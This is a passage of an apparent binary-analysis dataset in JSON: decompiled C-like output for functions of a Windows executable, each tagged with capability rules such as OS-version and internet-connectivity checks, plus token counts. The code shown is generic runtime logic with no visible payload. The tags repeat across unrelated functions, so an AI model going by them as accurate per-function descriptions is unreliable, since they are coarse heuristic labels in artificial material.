        "decompiled_code": "\n// WARNING: Could not reconcile some variable overlaps\n\nvoid __cdecl fcn.0041c234(int32_t arg_8h)\n\n{\n    uint *in_FS_OFFSET;\n    uint arg_8h_00;\n    uint *arg_ch;\n    uint uStack32;\n    uint uStack28;\n    uchar *puStack24;\n    uint var_10h;\n    uint var_ch;\n    uint var_8h;\n    uint var_4h;\n    \n    puStack24 = &stack0xfffffffc;\n    var_10h = 0;\n    var_4h = 0;\n    uStack28 = 0x41c2c6;\n    uStack32 = *in_FS_OFFSET;\n    *in_FS_OFFSET = &uStack32;\n    if (*(arg_8h + 8) == '\\0') {\n        fcn.00405728();\n    }\n    else {\n        puStack24 = &stack0xfffffffc;\n        fcn.00409d70();\n    }\n    var_ch = var_4h;\n    var_8h._0_1_ = 0xb;\n    arg_ch = &var_ch;\n    arg_8h_00 = 0;\n    fcn.00407550();\n    fcn.0040db38(arg_8h_00, arg_ch);\n    fcn.00404ec4();\n    *in_FS_OFFSET = arg_8h_00;\n    uStack32 = 0x41c2cd;\n    fcn.00405530();\n    fcn.00405530();\n    return;\n}\n",
        "token_count": 337
    },
    "0041c52c": {
        "rules": [
            "check OS version/c2d5920d27eb4726b54299bacf904e17",
            "check OS version/c2d5920d27eb4726b54299bacf904e17",
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32",
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32",
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check OS version/eb1d2d86c0084793ad233d63869572f1",
            "check OS version/eb1d2d86c0084793ad233d63869572f1"
        ],
        "decompiled_code": "\nbool fcn.0041c52c(void)\n\n{\n    char cVar1;\n    int32_t in_EAX;\n    char *pcVar2;\n    \n    for (pcVar2 = *(in_EAX + 0x14); (*pcVar2 != '\\0' && (*pcVar2 != '.')); pcVar2 = pcVar2 + 1) {\n    }\n    cVar1 = *pcVar2;\n    if (cVar1 != '\\0') {\n        fcn.00405620();\n        fcn.00405a84();\n    }\n    return cVar1 != '\\0';\n}\n",
        "token_count": 132
    },
    "0041c608": {
        "rules": [
            "check OS version/c2d5920d27eb4726b54299bacf904e17",
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32",
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check OS version/eb1d2d86c0084793ad233d63869572f1"
        ],
        "decompiled_code": "\nvoid __fastcall fcn.0041c608(uint param_1, char *param_2)\n\n{\n    char cVar1;\n    int32_t in_EAX;\n    int32_t iVar2;\n    uint *in_FS_OFFSET;\n    uint uStack40;\n    uint uStack36;\n    uchar *puStack32;\n    uint var_ch;\n    uint var_8h;\n    uint var_4h;\n    \n    puStack32 = &stack0xfffffffc;\n    uStack36 = 0x41c6b1;\n    uStack40 = *in_FS_OFFSET;\n    *in_FS_OFFSET = &stack0xffffffd8;\n    if (param_2 != NULL) {\n        while (*param_2 != '\\0') {\n            for (; (*param_2 != '\\0' && (1 < *param_2 - 0x2dU)); param_2 = param_2 + 1) {\n            }\n            fcn.00405620();\n            iVar2 = fcn.004204e4();\n            if ((iVar2 == 0) && (cVar1 = fcn.00409a84(),  cVar1 != '\\0')) {\n                iVar2 = in_EAX;\n            }\n            if (iVar2 == 0) break;\n            if (*param_2 == '.') {\n                param_2 = param_2 + 1;\n            }\n            if (*param_2 == '-') {\n                param_2 = param_2 + 1;\n            }\n            in_EAX = iVar2;\n            if (*param_2 == '>') {\n                param_2 = param_2 + 1;\n            }\n        }\n    }\n    *in_FS_OFFSET = uStack40;\n    puStack32 = 0x41c6b8;\n    uStack36 = 0x41c6b0;\n    fcn.00405530();\n    return;\n}\n",
        "token_count": 405
    },
    "0041c754": {
        "rules": [
            "check OS version/c2d5920d27eb4726b54299bacf904e17",
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32",
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check OS version/eb1d2d86c0084793ad233d63869572f1"
        ],
        "decompiled_code": "\nvoid fcn.0041c754(void)\n\n{\n    int32_t iVar1;\n    uint *puVar2;\n    int32_t iVar3;\n    int32_t iVar4;\n    int32_t iVar5;\n    uint *in_FS_OFFSET;\n    uint uStack80;\n    uint uStack76;\n    uchar *puStack72;\n    uint uStack68;\n    uint uStack64;\n    uchar *puStack60;\n    uint uStack56;\n    uint uStack52;\n    uchar *puStack48;\n    uint uStack44;\n    uint uStack40;\n    uchar *puStack36;\n    uint var_10h;\n    uint var_ch;\n    uint var_8h;\n    uint var_4h;\n    \n    puStack36 = 0x41c767;\n    (**(**0x4999b0 + 0x14))();\n    uStack40 = 0x41c910;\n    uStack44 = *in_FS_OFFSET;\n    *in_FS_OFFSET = &stack0xffffffd4;\n    puStack48 = 0x41c77f;\n    puStack36 = &stack0xfffffffc;\n    iVar1 = fcn.00419c08();\n    uStack52 = 0x41c8f1;\n    uStack56 = *in_FS_OFFSET;\n    *in_FS_OFFSET = &stack0xffffffc8;\n    if (*(iVar1 + 8) < 1) {\n        *in_FS_OFFSET = uStack56;\n        puStack48 = 0x41c8f8;\n        uStack52 = 0x41c8f0;\n        fcn.00419c6c();\n        return;\n    }\n    puStack60 = 0x41c7a5;\n    puStack48 = &stack0xfffffffc;\n    fcn.00404620();\n    uStack64 = 0x41c8d2;\n    uStack68 = *in_FS_OFFSET;\n    *in_FS_OFFSET = &stack0xffffffbc;\n    puStack72 = 0x41c7c2;\n    puStack60 = &stack0xfffffffc;\n    fcn.00404620();\n    uStack76 = 0x41c880;\n    uStack80 = *in_FS_OFFSET;\n    *in_FS_OFFSET = &stack0xffffffb0;\n    iVar5 = 0;\n    puStack72 = &stack0xfffffffc;\ncode_r0x0041c861:\n    while( true ) {\n        if (*(iVar1 + 8) <= iVar5) {\n            *in_FS_OFFSET = uStack80;\n            puStack72 = 0x41c887;\n            uStack76 = 0x41c87f;\n            fcn.00404650();\n            return;\n        }\n        puVar2 = fcn.00419898();\n        iVar3 = fcn.004193e4();\n        if (iVar3 != 0) break;\n        iVar4 = fcn.00416614();\n        if (iVar4 != 0) break;\n        fcn.0041c70c(&stack0xfffffffc);\n        iVar5 = iVar5 + 1;\n    }\n    if (iVar3 != 0) {\n        if ((*(iVar3 + 0x1c) & 2) != 0) {\n            fcn.0041c70c(&stack0xfffffffc);\n            iVar5 = iVar5 + 1;\n            goto code_r0x0041c861;\n        }\n        fcn.0041c608();\n        (***puVar2)();\n    }\n    fcn.0041c6d4(&stack0xfffffffc);\n    fcn.0041978c();\n    fcn.00404650();\n    goto code_r0x0041c861;\n}\n",
        "token_count": 809
    },
    "0041c920": {
        "rules": [
            "check OS version/c2d5920d27eb4726b54299bacf904e17",
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32",
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check OS version/eb1d2d86c0084793ad233d63869572f1"
        ],
        "decompiled_code": "\nvoid __fastcall fcn.0041c920(uint param_1, int32_t param_2)\n\n{\n    char cVar1;\n    int32_t in_EAX;\n    int32_t iVar2;\n    int32_t iVar3;\n    uint *in_FS_OFFSET;\n    uint uStack36;\n    uint uStack32;\n    uchar *puStack28;\n    uint var_8h;\n    uint var_4h;\n    \n    if (*0x4999cc == 0) {\n        return;\n    }\n    puStack28 = 0x41c946;\n    iVar2 = fcn.00419c08();\n    uStack32 = 0x41c9bb;\n    uStack36 = *in_FS_OFFSET;\n    *in_FS_OFFSET = &stack0xffffffdc;\n    iVar2 = *(iVar2 + 8) + -1;\n    puStack28 = &stack0xfffffffc;\n    if (-1 < iVar2) {\n        do {\n            iVar3 = fcn.00419898();\n            if ((in_EAX == 0) || (*(iVar3 + 8) == in_EAX)) {\n                if (param_2 != 0) {\n                    cVar1 = fcn.00409a84();\n                    if (cVar1 == '\\0') goto code_r0x0041c99d;\n                }\n                fcn.0041978c();\n                fcn.00404650();\n            }\ncode_r0x0041c99d:\n            iVar2 = iVar2 + -1;\n        } while (iVar2 != -1);\n    }\n    *in_FS_OFFSET = uStack36;\n    puStack28 = 0x41c9c2;\n    uStack32 = 0x41c9ba;\n    fcn.00419c6c();\n    return;\n}\n",
        "token_count": 392
    },
    "0041c9cc": {
        "rules": [
            "check OS version/c2d5920d27eb4726b54299bacf904e17",
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32",
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check OS version/eb1d2d86c0084793ad233d63869572f1"
        ],
        "decompiled_code": "\nvoid fcn.0041c9cc(void)\n\n{\n    int32_t in_EAX;\n    int32_t iVar1;\n    int32_t iVar2;\n    uint *in_FS_OFFSET;\n    uint uStack32;\n    uint uStack28;\n    uchar *puStack24;\n    uint var_4h;\n    \n    if (*0x4999cc != 0) {\n        puStack24 = 0x41c9e9;\n        iVar1 = fcn.00419c08();\n        uStack28 = 0x41ca43;\n        uStack32 = *in_FS_OFFSET;\n        *in_FS_OFFSET = &stack0xffffffe0;\n        iVar1 = *(iVar1 + 8) + -1;\n        puStack24 = &stack0xfffffffc;\n        if (-1 < iVar1) {\n            do {\n                iVar2 = fcn.00419898();\n                if (*(iVar2 + 4) == in_EAX) {\n                    fcn.0041978c();\n                    fcn.00404650();\n                }\n                iVar1 = iVar1 + -1;\n            } while (iVar1 != -1);\n        }\n        *in_FS_OFFSET = uStack32;\n        puStack24 = 0x41ca4a;\n        uStack28 = 0x41ca42;\n        fcn.00419c6c();\n        return;\n    }\n    return;\n}\n",
        "token_count": 302
    },
    "0041cb18": {
        "rules": [
            "check OS version/c2d5920d27eb4726b54299bacf904e17",
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32",
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check OS version/eb1d2d86c0084793ad233d63869572f1"
        ],
        "decompiled_code": "\nvoid __cdecl fcn.0041cb18(uint noname_0, uint noname_1, code *arg_10h, uint arg_14h)\n\n{\n    char cVar1;\n    \n    cVar1 = fcn.00409a84();\n    if ((cVar1 != '\\0') && (arg_10h._2_2_ != 0)) {\n        (*arg_10h)();\n        fcn.00405530();\n    }\n    return;\n}\n",
        "token_count": 104
    },
    "0041cb54": {
        "rules": [
            "check OS version/c2d5920d27eb4726b54299bacf904e17",
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32",
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check OS version/eb1d2d86c0084793ad233d63869572f1"
        ],
        "decompiled_code": "\nvoid __cdecl fcn.0041cb54(uint noname_0, uint noname_1, code *arg_10h, uint arg_14h)\n\n{\n    char cVar1;\n    int32_t in_EAX;\n    int32_t *piVar2;\n    uint *in_FS_OFFSET;\n    uint uStack32;\n    uint uStack28;\n    uchar *puStack24;\n    uint var_ch;\n    uint var_8h;\n    uint var_4h;\n    \n    puStack24 = 0x41cb70;\n    cVar1 = fcn.00409a84();\n    if ((cVar1 != '\\0') && (arg_10h._2_2_ != 0)) {\n        puStack24 = 0x41cb8b;\n        cVar1 = fcn.0041ebc0();\n        if (cVar1 != '\\n') {\n            *(in_EAX + 0x10) = *(in_EAX + 0x10) + -1;\n            puStack24 = 0x41cb9d;\n            fcn.0041ecd0();\n            *(in_EAX + 0x88) = 1;\n            puStack24 = 0x41cbac;\n            fcn.0041ca68();\n        }\n        puStack24 = 0x41cbb8;\n        piVar2 = fcn.00404620();\n        uStack28 = 0x41cc1e;\n        uStack32 = *in_FS_OFFSET;\n        *in_FS_OFFSET = &stack0xffffffe0;\n        puStack24 = &stack0xfffffffc;\n        fcn.0041d058();\n        (**(*piVar2 + 4))();\n        fcn.0041d058();\n        *(in_EAX + 0x88) = 1;\n        (*arg_10h)();\n        *in_FS_OFFSET = uStack32;\n        puStack24 = 0x41cc25;\n        uStack28 = 0x41cc1d;\n        fcn.00404650();\n        return;\n    }\n    return;\n}\n",
        "token_count": 456
    },
    "0041cc74": {
        "rules": [
            "check OS version/c2d5920d27eb4726b54299bacf904e17",
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32",
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check OS version/eb1d2d86c0084793ad233d63869572f1"
        ],
        "decompiled_code": "\nvoid __cdecl fcn.0041cc74(int32_t *arg_8h)\n\n{\n    int32_t *in_EAX;\n    int32_t iVar1;\n    int32_t in_EDX;\n    uint var_10ch;\n    char var_9h;\n    uint var_8h;\n    int32_t var_4h;\n    \n    var_4h = in_EDX;\n    if (*(in_EAX + 0x42) == 0) {\n        var_9h = '\\x01';\n    }\n    else {\n        fcn.004057e8();\n        iVar1 = fcn.004048d4();\n        *arg_8h = iVar1;\n        arg_8h[1] = var_4h;\n        var_9h = *arg_8h == 0;\n        (*in_EAX[0x10])(&var_9h, arg_8h);\n    }\n    if (var_9h != '\\0') {\n        arg_8h[1] = var_4h;\n        iVar1 = (**(*in_EAX + 0x1c))();\n        *arg_8h = iVar1;\n    }\n    return;\n}\n",
        "token_count": 260
    },
    "0041cd64": {
        "rules": [
            "check OS version/c2d5920d27eb4726b54299bacf904e17",
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32",
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check OS version/eb1d2d86c0084793ad233d63869572f1"
        ],
        "decompiled_code": "\nvoid fcn.0041cd64(void)\n\n{\n    int32_t in_EAX;\n    int32_t iVar1;\n    int32_t iVar2;\n    uint *in_FS_OFFSET;\n    uint uStack28;\n    uint uStack24;\n    uchar *puStack20;\n    \n    puStack20 = 0x41cd76;\n    iVar1 = fcn.00419c08();\n    uStack24 = 0x41cdd4;\n    uStack28 = *in_FS_OFFSET;\n    *in_FS_OFFSET = &stack0xffffffe4;\n    iVar1 = *(iVar1 + 8) + -1;\n    puStack20 = &stack0xfffffffc;\n    if (-1 < iVar1) {\n        do {\n            iVar2 = fcn.00419898();\n            if ((*(iVar2 + 4) == *(in_EAX + 4)) && (*(iVar2 + 0xc) == *(in_EAX + 0xc))) {\n                fcn.00404650();\n                fcn.0041978c();\n            }\n            iVar1 = iVar1 + -1;\n        } while (iVar1 != -1);\n    }\n    *in_FS_OFFSET = uStack28;\n    puStack20 = 0x41cddb;\n    uStack24 = 0x41cdd3;\n    fcn.00419c6c();\n    return;\n}\n",
        "token_count": 299
    },
    "0041cde0": {
        "rules": [
            "check OS version/c2d5920d27eb4726b54299bacf904e17",
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32",
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check OS version/eb1d2d86c0084793ad233d63869572f1"
        ],
        "decompiled_code": "\nvoid fcn.0041cde0(void)\n\n{\n    int32_t iVar1;\n    uchar *puVar2;\n    char cVar3;\n    int32_t *in_EAX;\n    uint *puVar4;\n    uint *in_FS_OFFSET;\n    uint uStack56;\n    uint uStack52;\n    uchar *puStack48;\n    uint uStack44;\n    uint uStack40;\n    uchar *puStack36;\n    int32_t var_10h;\n    int32_t var_ch;\n    int32_t *var_8h;\n    uint var_4h;\n    \n    puStack36 = &stack0xfffffffc;\n    puStack48 = &stack0xfffffffc;\n    var_4h = 0;\n    uStack40 = 0x41cf16;\n    uStack44 = *in_FS_OFFSET;\n    *in_FS_OFFSET = &stack0xffffffd4;\n    iVar1 = in_EAX[0xc];\n    if (iVar1 != 0) {\n        uStack52 = 0x41cef9;\n        uStack56 = *in_FS_OFFSET;\n        *in_FS_OFFSET = &stack0xffffffc8;\n        var_10h = *(iVar1 + 8);\n        puVar2 = &stack0xfffffffc;\n        var_8h = in_EAX;\n        if (-1 < var_10h + -1) {\n            do {\n                puStack36 = puVar2;\n                puVar4 = fcn.00419898();\n                fcn.004055c8();\n                (**(*var_8h + 0x24))();\n                var_ch = fcn.0041c608();\n                if ((var_ch == 0) && (*(var_8h + 0x7a) != 0)) {\n                    (*var_8h[0x1e])(&fcn.0041cde0::var_ch);\n                }\n                fcn.00419898();\n                fcn.0041cd64();\n                if ((var_ch == 0) && (cVar3 = fcn.0041c52c(),  cVar3 != '\\0')) {\n                    fcn.00419898();\n                    fcn.00419b80();\n                    fcn.0041998c();\n                }\n                else {\n                    (***puVar4)();\n                }\n                var_10h = var_10h + -1;\n                puVar2 = puStack36;\n            } while (var_10h != 0);\n        }\n        *in_FS_OFFSET = uStack56;\n        puStack48 = 0x41cf00;\n        uStack52 = 0x41cef8;\n        fcn.0041cf48();\n        return;\n    }\n    *in_FS_OFFSET = uStack44;\n    puStack36 = 0x41cf1d;\n    uStack40 = 0x41cf15;\n    fcn.00405530();\n    return;\n}\n",
        "token_count": 632
    },
    "0041d334": {
        "rules": [
            "check OS version/c2d5920d27eb4726b54299bacf904e17",
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32",
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check OS version/eb1d2d86c0084793ad233d63869572f1"
        ],
        "decompiled_code": "\n// WARNING: Variable defined which should be unmapped: var_3h\n\nvoid __cdecl fcn.0041d334(int32_t arg_8h)\n\n{\n    int32_t iVar1;\n    uint16_t in_AX;\n    int32_t iVar2;\n    char in_DL;\n    int32_t iVar3;\n    uint var_3h;\n    \n    iVar2 = fcn.0040676c();\n    if (-1 < iVar2 + -1) {\n        iVar3 = 0;\n        do {\n            if (in_DL == '\\0') {\n                iVar1 = *(*(arg_8h + -4) + iVar3 * 4);\n                *(iVar1 + 0x1c) = ~in_AX & *(iVar1 + 0x1c);\n            }\n            else {\n                iVar1 = *(*(arg_8h + -4) + iVar3 * 4);\n                *(iVar1 + 0x1c) = *(iVar1 + 0x1c) | in_AX;\n            }\n            iVar3 = iVar3 + 1;\n            iVar2 = iVar2 + -1;\n        } while (iVar2 != 0);\n    }\n    return;\n}\n",
        "token_count": 258
    },
    "0041d41c": {
        "rules": [
            "check OS version/c2d5920d27eb4726b54299bacf904e17",
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32",
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check OS version/eb1d2d86c0084793ad233d63869572f1"
        ],
        "decompiled_code": "\nvoid __cdecl fcn.0041d41c(int32_t arg_8h)\n\n{\n    uint16_t *puVar1;\n    int32_t iVar2;\n    uint uVar3;\n    uint *in_FS_OFFSET;\n    uint uStack40;\n    uint uStack36;\n    uchar *puStack32;\n    uint uStack28;\n    uint uStack24;\n    uchar *puStack20;\n    \n    puStack20 = &stack0xfffffffc;\n    uStack24 = 0x41d502;\n    uStack28 = *in_FS_OFFSET;\n    *in_FS_OFFSET = &stack0xffffffe4;\n    puStack32 = 0x41d441;\n    iVar2 = fcn.0041f068();\n    *(arg_8h + -0x14) = 0;\n    if (*(*(arg_8h + -8) + 0x72) != 0) {\n        puStack32 = arg_8h + -0x14;\n        uStack36 = 0x41d473;\n        (**(*(arg_8h + -8) + 0x70))();\n    }\n    if (*(arg_8h + -0x14) == 0) {\n        puStack32 = 0x41d481;\n        uVar3 = (**(iVar2 + -0xc))();\n        *(arg_8h + -0x14) = uVar3;\n        if ((*(arg_8h + -9) & 4) != 0) {\n            puVar1 = *(arg_8h + -0x14) + 0x1c;\n            *puVar1 = *puVar1 | 1;\n            puVar1 = *(arg_8h + -0x14) + 0x1c;\n            *puVar1 = *puVar1 | 0x200;\n        }\n        uStack36 = 0x41d4d6;\n        uStack40 = *in_FS_OFFSET;\n        *in_FS_OFFSET = &stack0xffffffd8;\n        puStack32 = &stack0xfffffffc;\n        (**(**(arg_8h + -0x14) + 0x2c))();\n        *in_FS_OFFSET = uStack40;\n    }\n    puVar1 = *(arg_8h + -0x14) + 0x1c;\n    *puVar1 = *puVar1 | 1;\n    *in_FS_OFFSET = uStack28;\n    return;\n}\n",
        "token_count": 539
    },
    "0041d8b0": {
        "rules": [
            "check OS version/c2d5920d27eb4726b54299bacf904e17",
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32",
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check OS version/eb1d2d86c0084793ad233d63869572f1"
        ],
        "decompiled_code": "\nvoid fcn.0041d8b0(void)\n\n{\n    int32_t in_EAX;\n    uint uVar1;\n    uint *in_FS_OFFSET;\n    uint uStack24;\n    uint uStack20;\n    uchar *puStack16;\n    uint var_4h;\n    \n    if (*(in_EAX + 0x30) == 0) {\n        puStack16 = 0x41d8cf;\n        uVar1 = fcn.00404620();\n        *(in_EAX + 0x30) = uVar1;\n        uStack20 = 0x41d90b;\n        uStack24 = *in_FS_OFFSET;\n        *in_FS_OFFSET = &stack0xffffffe8;\n        puStack16 = &stack0xfffffffc;\n        fcn.0041d920();\n        fcn.0041cde0();\n        *in_FS_OFFSET = uStack24;\n        puStack16 = 0x41d91c;\n        uStack20 = 0x41d90a;\n        fcn.0041cf48();\n        return;\n    }\n    puStack16 = 0x41d91c;\n    fcn.0041d920();\n    return;\n}\n",
        "token_count": 262
    },
    "0041dd40": {
        "rules": [
            "check OS version/c2d5920d27eb4726b54299bacf904e17",
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32",
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check OS version/eb1d2d86c0084793ad233d63869572f1"
        ],
        "decompiled_code": "\n// WARNING: Could not reconcile some variable overlaps\n\nvoid __cdecl fcn.0041dd40(int32_t arg_8h)\n\n{\n    char cVar1;\n    int32_t in_EAX;\n    uint *in_FS_OFFSET;\n    uint uVar2;\n    uint uStack312;\n    uint uStack308;\n    uchar *puStack304;\n    int32_t var_124h;\n    uint var_120h;\n    uint var_11ch;\n    uint var_118h;\n    uint var_114h;\n    uint var_110h;\n    uint var_10ch;\n    uint var_108h;\n    uint var_104h;\n    int32_t var_4h;\n    \n    puStack304 = &stack0xfffffffc;\n    var_4h = 0;\n    uStack308 = 0x41de31;\n    uStack312 = *in_FS_OFFSET;\n    *in_FS_OFFSET = &uStack312;\n    fcn.00405530();\n    cVar1 = fcn.004047dc();\n    if (cVar1 != '\\0') {\n        fcn.004055c8();\n    }\n    if (var_4h == 0) {\n        fcn.00404530();\n        fcn.00405794();\n    }\n    var_124h = var_4h;\n    var_120h._0_1_ = 0xb;\n    var_11ch = **0x49498c;\n    var_118h._0_1_ = 0xb;\n    var_114h = *(arg_8h + -8);\n    var_110h._0_1_ = 0xb;\n    var_10ch = *(in_EAX + 4);\n    var_108h._0_1_ = 0xb;\n    uVar2 = 3;\n    fcn.0040dbf4(3, &var_124h);\n    fcn.00404ec4();\n    *in_FS_OFFSET = uVar2;\n    uStack312 = 0x41de38;\n    fcn.00405530();\n    return;\n}\n",
        "token_count": 458
    },
    "0041e258": {
        "rules": [
            "check OS version/c2d5920d27eb4726b54299bacf904e17",
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32",
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check OS version/eb1d2d86c0084793ad233d63869572f1"
        ],
        "decompiled_code": "\n// WARNING: Variable defined which should be unmapped: var_20h\n// WARNING: Variable defined which should be unmapped: var_24h\n// WARNING: Variable defined which should be unmapped: var_28h\n\nvoid fcn.0041e258(void)\n\n{\n    uchar *puVar1;\n    char cVar2;\n    int32_t *in_EAX;\n    int32_t iVar3;\n    uint *in_FS_OFFSET;\n    unkbyte10 Var4;\n    ulong uVar5;\n    uint var_2ch;\n    uint var_28h;\n    uint var_24h;\n    uint var_20h;\n    uint var_1ch;\n    uint var_18h;\n    uchar *var_14h;\n    uint var_ch;\n    uint var_8h;\n    uint var_4h;\n    \n    var_14h = &stack0xfffffffc;\n    iVar3 = 5;\n    do {\n        iVar3 = iVar3 + -1;\n    } while (iVar3 != 0);\n    var_18h = 0x41e564;\n    var_1ch = *in_FS_OFFSET;\n    *in_FS_OFFSET = &fcn.0041e258::var_1ch;\n    puVar1 = &stack0xfffffffc;\n    if (*0x8 == 0) {\n        puVar1 = &stack0xfffffffc;\n        if (**_pe_dos_header == '\\a') {\n            fcn.00416614();\n            cVar2 = fcn.004047dc();\n            puVar1 = var_14h;\n            if ((cVar2 != '\\0') && (iVar3 = fcn.00416614(),  puVar1 = var_14h,  (*(iVar3 + 0x24) & 4) != 0))\n            goto code_r0x0041e2cd;\n        }\n        var_14h = puVar1;\n        fcn.0041ca50();\n        puVar1 = var_14h;\n    }\ncode_r0x0041e2cd:\n    var_14h = puVar1;\n    // switch table (17 cases) at 0x41e2e7\n    switch(**_pe_dos_header) {\n    case '\\x01':\n        cVar2 = fcn.0041d034();\n        if (cVar2 == '\\a') {\n            fcn.0041db44();\n            fcn.0041e0b4();\n        }\n        else {\n            fcn.0041dc40();\n            fcn.00416688();\n        }\n        break;\n    case '\\x02':\n        fcn.0041d0f4();\n        fcn.00416688();\n        break;\n    case '\\x03':\n        fcn.0041db44();\n        fcn.00416540();\n        fcn.00416688();\n        break;\n    case '\\x04':\n        Var4 = fcn.0041d9f0();\n        var_28h = Var4;\n        var_24h = Var4 >> 0x20;\n        fcn.004169c0(var_28h, var_24h, CONCAT22(0x41, Var4 >> 0x40));\n        break;\n    case '\\x05':\n    case '\\n':\n        fcn.0041ea20();\n        fcn.004168b8();\n        break;\n    case '\\x06':\n        fcn.0041e904();\n        fcn.00416688();\n        break;\n    case '\\a':\n        cVar2 = fcn.0041d034();\n        if (cVar2 == '\\r') {\n            fcn.0041ebc0();\n            fcn.00416688();\n        }\n        else if (cVar2 == '\\x0e') {\n            fcn.0041ebc0();\n            fcn.00416614();\n            fcn.0041d1b0();\n        }\n        else {\n            fcn.0041db44();\n            var_24h = 0x41e4ab;\n            fcn.0041e0fc(&stack0xfffffffc);\n        }\n        break;\n    case '\\b':\n        cVar2 = fcn.0041d034();\n        if (cVar2 == '\\r') {\n            fcn.0041ebc0();\n            fcn.00416c0c();\n        }\n        else {\n            fcn.0041db44(0xe8);\n            var_24h = 0x41e4f7;\n            (**(*in_EAX + 0x18))();\n            if (var_14h != NULL) {\n                fcn.00416c0c();\n            }\n        }\n        break;\n    case '\\t':\n        fcn.0041d154();\n        fcn.00416688();\n        break;\n    case '\\v':\n        fcn.0041eadc();\n        fcn.004168e8();\n        break;\n    case '\\f':\n        var_24h = 0x41e513;\n        fcn.0041e13c(&stack0xfffffffc);\n        break;\n    case '\\x0f':\n        var_24h = 0x41e533;\n        fcn.0041e198(&stack0xfffffffc);\n        break;\n    case '\\x10':\n        uVar5 = fcn.0041dcac();\n        var_24h = uVar5;\n        fcn.00416c44(var_24h, uVar5 >> 0x20);\n    }\n    *in_FS_OFFSET = var_24h;\n    var_1ch = 0x41e56b;\n    fcn.00405554();\n    fcn.00405d28();\n    fcn.00405554();\n    return;\n}\n",
        "token_count": 1253
    },
    "0041e5d0": {
        "rules": [
            "check OS version/c2d5920d27eb4726b54299bacf904e17",
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32",
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check OS version/eb1d2d86c0084793ad233d63869572f1"
        ],
        "decompiled_code": "\nvoid __fastcall fcn.0041e5d0(uint param_1, int32_t *param_2)\n\n{\n    int32_t *in_EAX;\n    int32_t iVar1;\n    int32_t iVar2;\n    int32_t *piVar3;\n    uint *in_FS_OFFSET;\n    uint uStackY128;\n    uint uStackY124;\n    uchar *puStackY120;\n    uint uStackY116;\n    uint uStackY112;\n    uchar *puStackY108;\n    uint arg_8h;\n    uint uStack100;\n    uint uStack96;\n    uchar *puStack92;\n    uint uStack88;\n    uint uStack84;\n    uchar *puStack80;\n    uint uStack76;\n    uint uStack72;\n    uchar *puStack68;\n    uint var_30h;\n    uint var_2ch;\n    uint var_28h;\n    uint var_24h;\n    uint var_20h;\n    uint var_1ch;\n    uint var_18h;\n    uint var_10h;\n    int32_t *var_ch;\n    uint var_8h;\n    uint var_4h;\n    \n    puStack68 = &stack0xfffffffc;\n    puStack92 = &stack0xfffffffc;\n    uStack72 = 0x41e8f1;\n    uStack76 = *in_FS_OFFSET;\n    *in_FS_OFFSET = &stack0xffffffb4;\n    puStack80 = 0x41e609;\n    fcn.0041e9c0();\n    puStack80 = 0x41e618;\n    (**(**0x4999b0 + 0x14))();\n    uStack84 = 0x41e8cf;\n    uStack88 = *in_FS_OFFSET;\n    *in_FS_OFFSET = &stack0xffffffa8;\n    uStack96 = 0x41e890;\n    uStack100 = *in_FS_OFFSET;\n    *in_FS_OFFSET = &stack0xffffff9c;\n    puStack80 = &stack0xfffffffc;\n    (**(*in_EAX + 0x28))();\n    if (param_2 == NULL) {\n        fcn.0041e9e4();\n        iVar1 = fcn.00418ff8();\n        var_ch = (**(iVar1 + 0x2c))();\n        fcn.0041e9e4();\n        (**(*var_ch + 0x18))();\n    }\n    else {\n        fcn.0041e9e4();\n        var_ch = param_2;\n        if ((*(param_2 + 7) & 0x10) == 0) {\n            *(param_2 + 7) = *(param_2 + 7) | 1;\n            *(param_2 + 7) = *(param_2 + 7) | 2;\n            fcn.0041e9e4();\n            fcn.0041e570();\n            (**(*param_2 + 0x18))();\n        }\n        else {\n            fcn.0041e9e4();\n        }\n    }\n    in_EAX[6] = var_ch;\n    arg_8h = 1;\n    puStackY108 = 0x41e6e8;\n    fcn.00404528();\n    puStackY108 = 0x41e6f6;\n    iVar1 = fcn.00418d48(arg_8h);\n    in_EAX[0x21] = iVar1;\n    uStackY112 = 0x41e835;\n    uStackY116 = *in_FS_OFFSET;\n    *in_FS_OFFSET = &stack0xffffff8c;\n    in_EAX[7] = var_ch;\n    puStackY120 = 0x41e71b;\n    puStackY108 = &stack0xfffffffc;\n    iVar1 = fcn.00407688();\n    iVar1 = *(iVar1 + 8);\n    if (iVar1 == 0) {\n        puStackY120 = 0x41e741;\n        iVar2 = fcn.00404620();\n        in_EAX[0xd] = iVar2;\n    }\n    else {\n        in_EAX[0xd] = iVar1;\n    }\n    